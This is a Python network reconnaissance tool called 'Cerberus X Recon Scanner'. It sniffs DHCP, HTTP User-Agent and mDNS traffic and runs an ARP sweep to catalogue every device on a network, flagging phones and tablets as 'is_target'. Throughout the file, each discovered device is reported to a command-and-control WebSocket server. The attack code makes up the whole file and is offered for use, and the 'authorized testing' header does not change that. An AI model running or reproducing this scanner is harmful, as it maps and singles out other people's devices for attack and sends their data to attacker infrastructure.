#!/usr/bin/env python3
"""
RECON SCANNER v2.0 - Advanced Network Discovery
Multi-technique device detection with OS fingerprinting

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only
"""

import json
import websocket
import re
import time
import threading
import socket
import struct
import os
from scapy.all import *
from scapy.layers.dhcp import DHCP
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply

# ==================== CONFIG ====================
C2_URL = "ws://localhost:8080"
INTERFACE = "eth0"
SCAN_TIMEOUT = 60
DEVICE_SIGNATURES = {
    # Mobile devices
    'iphone': ['iphone', 'ios', 'apple', 'mobile', 'ipad'],
    'android': ['android', 'samsung', 'huawei', 'xiaomi', 'oneplus'],
    'ios': ['ios', 'iphone', 'ipad'],
    
    # IoT devices
    'camera': ['camera', 'ipcam', 'rtsp', 'onvif'],
    'smart_tv': ['tv', 'samsungtv', 'androidtv', 'webos'],
    'assistant': ['googlehome', 'alexa', 'smart', 'speaker'],
    
    # Network devices
    'router': ['router', 'gateway', 'ap', 'accesspoint'],
    'switch': ['switch', 'hub', 'bridge'],
    
    # Computers
    'windows': ['windows', 'win', 'pc'],
    'linux': ['linux', 'ubuntu', 'debian', 'centos', 'kali'],
    'mac': ['mac', 'darwin']
}

# ==================== RECON SCANNER ====================
class CerberusRecon:
    """Advanced network reconnaissance scanner"""
    
    def __init__(self, interface=INTERFACE, c2_url=C2_URL):
        self.interface = interface
        self.c2_url = c2_url
        self.ws = None
        self.devices = {}
        self.scanning = True
        self.start_time = time.time()
        
        # Setup WebSocket
        self._connect_c2()
        
        # Setup interface
        self._setup_interface()
    
    def _connect_c2(self):
        """Connect to C2 server"""
        try:
            self.ws = websocket.create_connection(self.c2_url)
            print(f"[+] Connected to C2: {self.c2_url}")
        except Exception as e:
            print(f"[-] C2 connection failed: {e}")
    
    def _setup_interface(self):
        """Setup interface for monitoring"""
        try:
            # Set to monitor mode
            os.system(f"ip link set {self.interface} down")
            os.system(f"iw dev {self.interface} set type monitor")
            os.system(f"ip link set {self.interface} up")
            print(f"[+] Interface {self.interface} in monitor mode")
        except Exception as e:
            print(f"[-] Interface setup failed: {e}")
    
    def _send_to_c2(self, data):
        """Send data to C2"""
        try:
            if self.ws:
                self.ws.send(json.dumps(data))
        except Exception as e:
            print(f"[-] Send to C2 failed: {e}")
    
    def _detect_os(self, hostname, user_agent, mac):
        """Detect OS from fingerprints"""
        if not hostname and not user_agent:
            return 'unknown'
        
        combined = f"{hostname} {user_agent}".lower()
        
        for os_type, signatures in DEVICE_SIGNATURES.items():
            for sig in signatures:
                if sig in combined:
                    return os_type
        
        # Check MAC OUI
        if mac:
            # Add OUI lookup here (simplified)
            pass
        
        return 'unknown'
    
    def _is_mobile(self, hostname, user_agent):
        """Check if device is mobile"""
        mobile_indicators = ['iphone', 'android', 'ios', 'mobile', 'samsung', 
                           'huawei', 'xiaomi', 'oneplus', 'ipad', 'tablet']
        combined = f"{hostname} {user_agent}".lower()
        
        for ind in mobile_indicators:
            if ind in combined:
                return True
        return False
    
    def sniff_dhcp(self, pkt):
        """DHCP packet handler"""
        if pkt.haslayer(DHCP):
            # Get hostname
            hostname = None
            for opt in pkt[DHCP].options:
                if opt[0] == 'hostname' and opt[1]:
                    hostname = opt[1].decode('utf-8', errors='ignore')
                    break
            
            # Get IP
            if hostname and pkt.haslayer(IP):
                ip = pkt[IP].src
                mac = pkt[Ether].src if pkt.haslayer(Ether) else 'unknown'
                
                # Check if new device
                if ip not in self.devices:
                    self.devices[ip] = {
                        'ip': ip,
                        'mac': mac,
                        'hostname': hostname,
                        'os': self._detect_os(hostname, '', mac),
                        'is_mobile': self._is_mobile(hostname, ''),
                        'vendor': 'Unknown',
                        'first_seen': time.time()
                    }
                    
                    self._send_to_c2({
                        'type': 'NEW_DEVICE',
                        'ip': ip,
                        'mac': mac,
                        'vendor': hostname[:30],
                        'is_target': self._is_mobile(hostname, ''),
                        'hostname': hostname,
                        'os': self.devices[ip]['os']
                    })
                    
                    print(f"[+] DHCP Device: {ip} ({hostname})")
    
    def sniff_http(self, pkt):
        """HTTP packet handler for User-Agent"""
        if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].dport == 80:
            try:
                load = pkt[Raw].load.decode('utf-8', errors='ignore')
                
                # Extract User-Agent
                ua_match = re.search(r"User-Agent: (.*?)(?:\r\n|\n)", load, re.I)
                if ua_match:
                    ua = ua_match.group(1)
                    ip = pkt[IP].src if pkt.haslayer(IP) else None
                    
                    if ip and ip not in self.devices:
                        mac = pkt[Ether].src if pkt.haslayer(Ether) else 'unknown'
                        
                        self.devices[ip] = {
                            'ip': ip,
                            'mac': mac,
                            'hostname': 'unknown',
                            'user_agent': ua[:50],
                            'os': self._detect_os('', ua, mac),
                            'is_mobile': self._is_mobile('', ua),
                            'vendor': 'Web Client',
                            'first_seen': time.time()
                        }
                        
                        self._send_to_c2({
                            'type': 'NEW_DEVICE',
                            'ip': ip,
                            'mac': mac,
                            'vendor': 'Web Client',
                            'is_target': self._is_mobile('', ua),
                            'hostname': ua[:30],
                            'os': self.devices[ip]['os']
                        })
                        
                        print(f"[+] HTTP Device: {ip} ({ua[:30]})")
                        
            except:
                pass
    
    def sniff_mdns(self, pkt):
        """mDNS packet handler"""
        if pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[UDP].sport == 5353:
            try:
                if pkt[DNS].qd:
                    qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                    ip = pkt[IP].src if pkt.haslayer(IP) else None
                    
                    if ip and ip not in self.devices:
                        mac = pkt[Ether].src if pkt.haslayer(Ether) else 'unknown'
                        
                        self.devices[ip] = {
                            'ip': ip,
                            'mac': mac,
                            'hostname': qname,
                            'os': self._detect_os(qname, '', mac),
                            'is_mobile': self._is_mobile(qname, ''),
                            'vendor': 'mDNS Device',
                            'first_seen': time.time()
                        }
                        
                        self._send_to_c2({
                            'type': 'NEW_DEVICE',
                            'ip': ip,
                            'mac': mac,
                            'vendor': qname[:30],
                            'is_target': self._is_mobile(qname, ''),
                            'hostname': qname,
                            'os': self.devices[ip]['os']
                        })
                        
                        print(f"[+] mDNS Device: {ip} ({qname})")
            except:
                pass
    
    def arp_scan(self):
        """Active ARP scanning"""
        try:
            # Get local network
            iface_ip = None
            for line in os.popen(f"ip addr show {self.interface}"):
                if 'inet ' in line:
                    iface_ip = line.strip().split()[1]
                    break
            
            if not iface_ip:
                return
            
            # Calculate network range
            ip_parts = iface_ip.split('/')
            network = ip_parts[0]
            prefix = int(ip_parts[1])
            
            # Scan network
            base = '.'.join(network.split('.')[:3])
            
            for i in range(1, 255):
                if not self.scanning:
                    break
                    
                ip = f"{base}.{i}"
                if ip != network:
                    # Send ARP request
                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                                 timeout=1, verbose=False)
                    
                    for _, rcv in ans:
                        if rcv.haslayer(ARP):
                            mac = rcv[ARP].hwsrc
                            if ip not in self.devices:
                                self.devices[ip] = {
                                    'ip': ip,
                                    'mac': mac,
                                    'hostname': 'unknown',
                                    'os': self._detect_os('', '', mac),
                                    'is_mobile': False,
                                    'vendor': 'ARP Device',
                                    'first_seen': time.time()
                                }
                                
                                self._send_to_c2({
                                    'type': 'NEW_DEVICE',
                                    'ip': ip,
                                    'mac': mac,
                                    'vendor': 'ARP Device',
                                    'is_target': False,
                                    'hostname': 'unknown',
                                    'os': self.devices[ip]['os']
                                })
                                
                                print(f"[+] ARP Device: {ip} ({mac})")
        except Exception as e:
            print(f"[-] ARP scan failed: {e}")
    
    def run(self):
        """Main scanning loop"""
        print("\n" + "="*60)
        print(" CERBERUS X - RECON SCANNER v2.0")
        print("="*60)
        print(f"[*] Interface: {self.interface}")
        print(f"[*] C2: {self.c2_url}")
        print(f"[*] Scanning for {SCAN_TIMEOUT}s...\n")
        
        # Start sniffing in separate thread
        sniff_thread = threading.Thread(target=self._sniff_loop, daemon=True)
        sniff_thread.start()
        
        # ARP scan
        self.arp_scan()
        
        # Wait for sniffing
        time.sleep(SCAN_TIMEOUT)
        
        self.scanning = False
        print(f"\n[+] Scan complete. Found {len(self.devices)} devices")
        
        # Generate report
        report = {
            'timestamp': time.time(),
            'duration': time.time() - self.start_time,
            'devices': self.devices,
            'count': len(self.devices)
        }
        
        with open('recon_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Report saved: recon_report.json")
    
    def _sniff_loop(self):
        """Sniffing loop with multiple filters"""
        try:
            # Start sniffing with multiple filters
            sniff(
                iface=self.interface,
                prn=self._packet_handler,
                store=0,
                timeout=SCAN_TIMEOUT
            )
        except Exception as e:
            print(f"[-] Sniff loop error: {e}")
    
    def _packet_handler(self, pkt):
        """Master packet handler"""
        if not self.scanning:
            return
        
        self.sniff_dhcp(pkt)
        self.sniff_http(pkt)
        self.sniff_mdns(pkt)

# ==================== MAIN ====================
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Recon Scanner v2.0")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("-c", "--c2", default="ws://localhost:8080", help="C2 WebSocket URL")
    parser.add_argument("-t", "--timeout", type=int, default=60, help="Scan timeout")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] Root privileges required")
        sys.exit(1)
    
    SCAN_TIMEOUT = args.timeout
    
    recon = CerberusRecon(args.interface, args.c2)
    recon.run()
